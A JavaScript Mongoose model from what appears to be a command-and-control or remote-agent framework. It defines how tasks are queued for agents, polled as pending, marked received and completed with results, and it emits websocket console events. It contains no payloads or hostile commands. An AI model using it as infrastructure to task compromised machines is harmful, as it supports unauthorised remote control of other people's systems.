/**
 * @file Tasks model
 * @author Umar Abdul
 */

import crypto from 'crypto';
import mongoose from 'mongoose';
import Agent, {getAgent} from './agent.js';

const taskSchema = mongoose.Schema({
  uid: {
    type: String,
    required: true,
  },
  owner: {
    type: String,
    required: true
  },
  agentID: {
    type: String,
    required: true
  },
  taskType: {
    type: String,
    required: true
  },
  data: {
    type: Object,
  },
  dateCreated: {
    type: Number,
    required: true
  },
  received: {
    type: Boolean,
    required: true,
    default: false
  },
  dateReceived: {
    type: Number
  },
  completed: {
    type: Boolean,
    required: true,
    default: false
  },
  dateCompleted: {
    type: Number
  },
  result: {
    type: String
  }
});

const Task = mongoose.model('task', taskSchema);
export default Task;

/**
 * Create a new task. Emits "new_task" ws event on success.
 * @param {string} owner - The task owner (username of the user that creates the task)
 * @param {object} data - The request body received.
 * @return {object} The task created.
 */
export const createTask = async (owner, data) => {

  const socketServer = global.socketServer;
  const taskID = crypto.randomBytes(8).toString('hex').trim();
  let agentID = data.agentID.toString().trim();
  const agent = await getAgent(agentID); // will throw an error in not valid.
  const taskType = data.taskType.toString().trim();
  const task = new Task({
    uid: taskID,
    owner,
    agentID: agent.uid,
    taskType,
    data: data.data,
    dateCreated: Date.now()
  });
  await task.save();
  socketServer.emit("new_task", task);
  socketServer.emit("agent_console_output", {
    agentID: task.agentID,
    msg: global.serverPrompt + `Task '${task.uid}' created by '${task.owner}'`
  });
  return task;
};

/**
 * Delete an existing task. Emits "task_deleted" ws event on success.
 * @param {string} agentID - The ID of the agent.
 * @param {string} taskID - The ID of the task.
 * @param {string} username - The username of the user that request the action.
 * @return {object} The query result.
 */
export const deleteTask = async (agentID, taskID, username) => {

  const socketServer = global.socketServer;
  agentID = agentID.toString();
  taskID = taskID.toString();
  const data = await Task.deleteOne({uid: taskID, agentID});
  if (data.deletedCount === 0){
    socketServer.emit("agent_console_output", {
      agentID,
      msg: global.serverPrompt + `Invalid task: ${taskID}`
    });
    throw new Error("Invalid task!");
  }
  socketServer.emit("task_deleted", {
    taskID,
    agentID,
    user: username
  });
  socketServer.emit("agent_console_output", {
    agentID,
    msg: global.serverPrompt + `Task '${taskID}' deleted by '${username}'`
  });
  return data;
};

/**
 * Delete all tasks for an agent.
 * This method does not emit any ws event as it is to be used only when deleting an agent,
 * and the "agent_deleted" event generated by the `deleteAgent` method of the agent model should take care of it.
 * @param {string} agentID - ID of the target agent.
 * @return {object} The query result.
 */
export const deleteAllTasks = async (agentID) => {
  return (await Task.deleteMany({agentID: agentID.toString()}));
};

/**
 * Get all tasks for the agent with the given ID.
 * It DOES NOT update the state of the task.
 * @param {string} agentID - A unique identifier for the agent.
 * @return {object} Available tasks. 
 */
export const getTasks = async (agentID) => {
  return await Task.find({agentID: agentID.toString()});
};

/**
 * Get all pending tasks (tasks that were never sent to the agent) for the agent with the given ID.
 * This is used by the agents, so we need to filter out what we send.
 * It DOES NOT update the state of the task.
 * @param {string} agentID - A unique identifier for the agent.
 * @return {object} Pending tasks. 
 */
export const getPendingTasks = async (agentID) => {
  
  const agent = await getAgent(agentID);
  if (agent.frozen)
    return [];
  return await Task.find({agentID: agentID.toString(), received: false}, ["uid", "taskType", "data"]);
};

/**
 * Get all the tasks available for all agents. This should only be accessible to authenticated users.
 * @return {object} All available tasks.
 */
export const getAllTasks = async () => {

  const allTasks = {};
  const agents = await Agent.find({});
  for (let agent of agents)
    allTasks[agent.uid] = [];
  const data = await Task.find({});
  for (let task of data){
    if (allTasks[task.agentID] !== undefined)
      allTasks[task.agentID].unshift(task);
  }
  return allTasks;
};

/**
 * Mark a task as received. Emits the "update_task" ws event on success.
 * @param {string} taskID - The ID of the task.
 * @return {object} The target task, null if invalid.
 */
export const markReceived = async (taskID) => {
  
  const socketServer = global.socketServer;
  const task = await Task.findOne({uid: taskID.toString()});
  if (!task)
    return null;
  task.received = true;
  task.dateReceived = Date.now();
  await task.save();
  socketServer.emit("update_task", task);
  socketServer.emit("agent_console_output", {
    agentID: task.agentID,
    msg: global.serverPrompt + `Task '${task.uid}' received by agent`
  });
  return task;
};

/**
 * Set the result of a task and mark it as complete. Emits the "update_task" event on success.
 * @param {string} taskID - The ID of the task.
 * @param {string} result - The result of the task.
 */
export const setResult = async (taskID, result) => {

  const socketServer = global.socketServer;
  const task = await Task.findOne({uid: taskID.toString()});
  if (!(task && task.completed === false))
    throw new Error("Invalid task!");
  task.completed = true;
  task.dateCompleted = Date.now();
  // Cleanup trailing newlines.
  result = result.toString().replace(/\r\n+$/, "");
  result = result.replace(/\n+$/, "");
  task.result = result;
  await task.save();
  socketServer.emit("update_task", task);
  socketServer.emit("agent_console_output", {
    agentID: task.agentID,
    msg: global.serverPrompt + `Task completed '${task.uid}'. ${task.result.length} bytes received.\n${task.result}`
  });
  return task;
};
